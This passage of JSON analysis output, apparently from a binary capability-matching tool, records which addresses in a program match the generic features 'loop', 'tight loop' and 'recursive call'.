                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442527424
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442527424
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442527668
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442527668
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442527976
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442527976
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442528888
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442529058
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442530640
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442530640
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442532048
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442532048
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442532056
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442532056
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442532064
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442532064
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442532168
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442532168
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442534248
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442534248
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442536764
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442536764
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442537388
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442537388
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442537800
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442538464
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442538464
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442542624
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442542624
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442544320
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442544445
                    },
                    {
                      "type": "absolute",
                      "value": 6442544398
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442544724
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442544724
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442547224
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442547224
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442549464
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442549464
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442549576
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442549576
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442549748
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442549748
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442549880
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442549880
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442549992
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442549992
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442550168
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442550168
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442550584
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442550584
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442550676
                    },
                    {
                      "type": "absolute",
                      "value": 6442550653
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442550952
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442550952
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442551872
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442551872
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442552772
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442552772
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442553164
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442553164
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442553556
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442553556
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442555788
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442556168
                    },
                    {
                      "type": "absolute",
                      "value": 6442556346
                    },
                    {
                      "type": "absolute",
                      "value": 6442556221
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442557384
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442557384
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442560188
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442560188
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442560977
                    },
                    {
                      "type": "absolute",
                      "value": 6442560282
                    },
                    {
                      "type": "absolute",
                      "value": 6442560492
                    },
                    {
                      "type": "absolute",
                      "value": 6442560671
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442561704
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442561704
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442564404
            },
            {
              "success": true,
              "node": {
                "type": "statement",
